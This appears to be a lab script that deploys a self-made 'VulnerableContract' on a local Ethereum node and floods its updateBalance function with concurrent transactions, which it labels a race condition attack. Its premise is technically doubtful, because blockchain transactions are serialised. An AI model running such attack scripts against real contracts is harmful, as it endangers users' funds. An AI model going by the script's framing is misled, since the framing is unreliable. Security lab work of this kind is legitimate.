from web3 import Web3
import json
import threading

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Load vulnerable contract ABI and bytecode
with open('VulnerableContract.json') as f:
    contract_data = json.load(f)
vulnerable_abi = contract_data['abi']
vulnerable_bytecode = contract_data['bytecode']

# Deploy vulnerable contract
def deploy_contract(abi, bytecode):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact({'from': w3.eth.accounts[0]})
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

vulnerable_contract = deploy_contract(vulnerable_abi, vulnerable_bytecode)

# Perform race condition attack
def send_race_condition_request(contract, amount, account):
    """Send a balance update request to the smart contract."""
    try:
        # Assuming `amount` and `account` are provided
        tx_hash = contract.functions.updateBalance(amount).transact({'from': account})
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Transaction successful: {tx_hash.hex()}")
    except Exception as e:
        print(f"Transaction failed: {e}")

def perform_race_condition_attack(contract, amount, num_requests, accounts):
    """Perform a race condition attack by sending concurrent requests."""
    threads = []
    for account in accounts:
        for _ in range(num_requests):
            thread = threading.Thread(target=send_race_condition_request, args=(contract, amount, account))
            threads.append(thread)
            thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Check the result
    for account in accounts:
        balance = contract.functions.balances(account).call()
        print(f"Balance of account {account}: {balance}")

# Example usage
if __name__ == "__main__":
    # Setup attack parameters
    ATTACK_AMOUNT = 100
    NUM_REQUESTS = 10
    ACCOUNTS = [w3.eth.accounts[1], w3.eth.accounts[2]]  # List of accounts to use for attack

    perform_race_condition_attack(vulnerable_contract, ATTACK_AMOUNT, NUM_REQUESTS, ACCOUNTS)
